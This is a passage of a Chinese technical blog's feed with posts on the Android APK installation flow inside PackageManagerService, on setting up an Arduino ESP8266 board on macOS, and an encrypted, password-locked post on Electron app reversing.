中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。</p><p>接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。</p><p>最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去</p><p>这里就跟 adb 安装走到了同一个流程中。</p><h4 id="深入-PMS-中的安装"><a href="#深入-PMS-中的安装" class="headerlink" title="深入 PMS 中的安装"></a>深入 PMS 中的安装</h4><p>上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152711796.png?raw=true" alt="image-20190801152711796"></p><p>在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。</p><p>所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。</p><p><strong>1、处理 INIT_COPY 消息</strong></p><p>首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。</p><p><strong>2、处理 MCS_BOUND 消息</strong></p><p>首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152741833.png?raw=true" alt="image-20190801152741833"></p><p>HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中，</p><p>InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法</p><p>以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制</p><p>HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152755489.png?raw=true" alt="image-20190801152755489"></p><p> installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法</p><p>其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看  installNewPackageLI() 流程</p><p>installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF()</p><p><strong>3、处理 POST_INSTALL 消息</strong></p><p>首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等</p><h4 id="安装过程小结"><a href="#安装过程小结" class="headerlink" title="安装过程小结"></a>安装过程小结</h4><p>与应用相关的一些目录</p><ul><li><p>/system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力</p></li><li><p>/system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用</p></li><li><p>/data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下</p></li></ul><ul><li><p>/data/data：用户应用数据存放路径，存在沙箱隔离</p></li><li><p>/data/dalvik-cache：存放应用的dex 文件</p></li><li><p>/data/system：存放应用安装相关文件</p><ul><li>packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表</li><li>package.list 指定应用的默认存储位置，userid 等</li></ul></li></ul><p>应用安装过程总结</p><ol><li>将应用 apk 拷贝到指定目录下</li><li>解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/<packagename> 数据目录</packagename></li><li>解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中</li><li>由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上</li></ol><h4 id="PMS-与-PM-与APM"><a href="#PMS-与-PM-与APM" class="headerlink" title="PMS 与 PM 与APM"></a>PMS 与 PM 与APM</h4><p>前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152858658.png?raw=true" alt="image-20190801152858658"></p><p>通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象</p><p>ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理</p><p>继续梳理一下这个类与 PMS 之间的关系</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152915992.png?raw=true" alt="image-20190801152915992"></p><p>IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法</p><p>IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface</p><p>IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager</p><ul><li>asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象</li><li>asBinder() 方法返回自身，即 IPackageManager.Stub 对象</li><li>重写了 onTransact() 方法，根据命令类型处理数据传输</li></ul><p>IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口</p><ul><li>mRemote对象是IBinder类型，是对IPackageManager.Stub的引用</li><li>重写了asBinder()方法，返回mRemote</li><li>实现了AIDL文件定义的接口</li></ul><p>PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能：</p><ul><li>安装/卸载/更新应用，包括 installPackage/</li><li>查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表</li><li>查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象</li><li>查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象</li><li>增加/删除权限，包括 addPermission/removePermission</li><li>清除用户数据/缓存/代码等</li></ul><p>PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集</p><p>ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法</p><p>PackageManagerService 继承了 IPackageManager.Stub</p><p>因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="http://androidxref.com/8.1.0_r33/xref/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/</a></li><li><a href="https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6" target="_blank" rel="external">https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6</a></li><li><a href="http://solart.cc/2016/10/30/install_apk/" target="_blank" rel="external">http://solart.cc/2016/10/30/install_apk/</a></li><li><a href="https://www.jianshu.com/p/4f16421d5c7f" target="_blank" rel="external">https://www.jianshu.com/p/4f16421d5c7f</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android应用安装过程深度解析&quot;&gt;&lt;a href=&quot;#Android应用安装过程深度解析&quot; class=&quot;headerlink&quot; title=&quot;Android应用安装过程深度解析&quot;&gt;&lt;/a&gt;Android应用安装过程深度解析&lt;/h3&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Arduino ESP8266开发板上手实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/</id>
    <published>2019-07-30T02:46:35.000Z</published>
    <updated>2019-08-09T08:47:21.452Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Arduino-ESP8266开发板上手实践"><a href="#Arduino-ESP8266开发板上手实践" class="headerlink" title="Arduino ESP8266开发板上手实践"></a>Arduino ESP8266开发板上手实践</h3><h4 id="环境搭建（macOS）"><a href="#环境搭建（macOS）" class="headerlink" title="环境搭建（macOS）"></a>环境搭建（macOS）</h4><p>官方说明：<a href="https://github.com/esp8266/Arduino">https://github.com/esp8266/Arduino</a></p><ul><li><p><strong>安装IDE （Arduino IDE）</strong></p><p>下载地址：<a href="https://www.arduino.cc/en/main/software" target="_blank" rel="external">https://www.arduino.cc/en/main/software</a></p><p>还有种方式是利用<a href="https://github.com/plerup/makeEspArduino">Makefile</a>去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。</p></li></ul><ul><li><p><strong>下载ESP8266硬件包</strong></p><p>1 、在设置里面的附加板管理器网址中增加以下链接<code>https://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143145367.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、在工具中找到你的开发板，然后进入开发板管理器，搜索<strong>esp8266</strong>安装该库，我这里已经安装了。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143643887.png?raw=true" width="500" hegiht="313" align="center"></p><p>注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考<a href="https://github.com/esp8266/Arduino">这里</a></p></li><li><p><strong>运行示例代码</strong></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730144157955.png?raw=true" width="500" hegiht="313" align="center"></p><p>我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。</p><p>代码如下</p><pre><code class="c">/*  ESP8266 Blink by Simon Peter  Blink the blue LED on the ESP-01 module  This example code is in the public domain  The blue LED on the ESP-01 module is connected to GPIO1  (which is also the TXD pin; so we cannot use Serial.print() at the same time)  Note that this sketch uses LED_BUILTIN to find the pin with the internal LED*/void setup() {  pinMode(LED_BUILTIN, OUTPUT);     // Initialize the LED_BUILTIN pin as an output}// the loop function runs over and over again forevervoid loop() {  digitalWrite(LED_BUILTIN, LOW);   // Turn the LED on (Note that LOW is the voltage level  // but actually the LED is on; this is because  // it is active low on the ESP-01)  delay(1000);                      // Wait for a second  digitalWrite(LED_BUILTIN, HIGH);  // Turn the LED off by making the voltage HIGH  delay(2000);                      // Wait for two seconds (to demonstrate the active low LED)}</code></pre><p>在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。</p></li></ul><h4 id="重要！！！一些坑以及注意点"><a href="#重要！！！一些坑以及注意点" class="headerlink" title="重要！！！一些坑以及注意点"></a>重要！！！一些坑以及注意点</h4><p>下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。</p><p>确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。</p><p>1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。<a href="https://developer.apple.com/download/more/" target="_blank" rel="external">下载地址1</a> <a href="https://github.com/vulgo/IORegistryExplorer">下载地址2</a> <a href="https://mac.softpedia.com/get/System-Utilities/IORegistryExplorer.shtml" target="_blank" rel="external">下载地址3</a>在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145128956.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过<code>Virtual COM Port</code>去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的<code>/dev</code>目录下并没有出现对应的文件。之前的驱动大多是这个<a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">CH340G CH34G CH34X Mac OS X driver</a> 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在<a href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers" target="_blank" rel="external">这里</a>。安装完以后在<code>/dev</code>就应该有一个<code>tty.SLAB_USBtoUART</code>的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145909934.png?raw=true" width="500" hegiht="313" align="center"></p><h4 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h4><p>这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下</p><ul><li><p><a href="https://www.arduino.cc/en/guide/macOSX?setlang=cn" target="_blank" rel="external">https://www.arduino.cc/en/guide/macOSX?setlang=cn</a></p><p>在Mac OS X系统上入门Arduino/ Genuino</p></li><li><p><a href="https://juejin.im/post/5b569026e51d4513ee6dd509" target="_blank" rel="external">https://juejin.im/post/5b569026e51d4513ee6dd509</a></p><p>Esp8266+Arduino+Mac开发环境搭建</p></li><li><p><a href="https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/" target="_blank" rel="external">https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/</a></p><p>Program an ESP8266 from Arduino on MacOS</p></li><li><p><a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver</a></p><p>CH340G CH34G CH34X Mac OS X driver</p></li><li><p><a href="http://www.nodemcu.com" target="_blank" rel="external">http://www.nodemcu.com</a></p><p>资料下载访问官网</p></li><li><p><a href="https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg" target="_blank" rel="external">https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg</a></p><p>NODEMCU资料</p></li><li><p><a href="http://www.wch.cn/download/CH341SER_MAC_ZIP.html" target="_blank" rel="external">http://www.wch.cn/download/CH341SER_MAC_ZIP.html</a></p><p>mac串口驱动下载地址</p></li><li><p><a href="https://freeware.the-meiers.org/" target="_blank" rel="external">https://freeware.the-meiers.org/</a></p><p>CoolTerm串口监控工具下载</p></li><li><p>SIP禁用步骤</p><pre><code>1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r2. 终端中输入csrutil disable/status/enabled3. 重启mac</code></pre></li></ul><h4 id="AVR逆向基础"><a href="#AVR逆向基础" class="headerlink" title="AVR逆向基础"></a>AVR逆向基础</h4><p>下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。</p><p>由于我们主要是研究iOT逆向，所以可能不会关注在实际开发上面。这里先学习下Arduino上面的执行文件格式，以及指令架构等。</p><p>我们通常说的Arduino上面就运行的是一个AVR指令架构的处理器。</p><blockquote><p>AVR refers to the line of MCUs manufactured by Atmel and used in the original designs.</p></blockquote><p>由于ida对这个执行文件的支持不是很好，我们准备用<a href="https://github.com/radare/radare2">radare2</a>来分析这个bin文件。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="https://blog.csdn.net/iotisan/article/details/78766463" target="_blank" rel="external">https://blog.csdn.net/iotisan/article/details/78766463</a></p><p>和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路</p></li><li><p><a href="https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/" target="_blank" rel="external">https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/</a></p><p>Any NodeMCU esp8266 Drivers for MacOS Mojave?</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Arduino-ESP8266开发板上手实践&quot;&gt;&lt;a href=&quot;#Arduino-ESP8266开发板上手实践&quot; class=&quot;headerlink&quot; title=&quot;Arduino ESP8266开发板上手实践&quot;&gt;&lt;/a&gt;Arduino ESP8266开发板上手
      
    
    </summary>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IOT/"/>
    
    
      <category term="Arduino" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"/>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T14:45:34.468Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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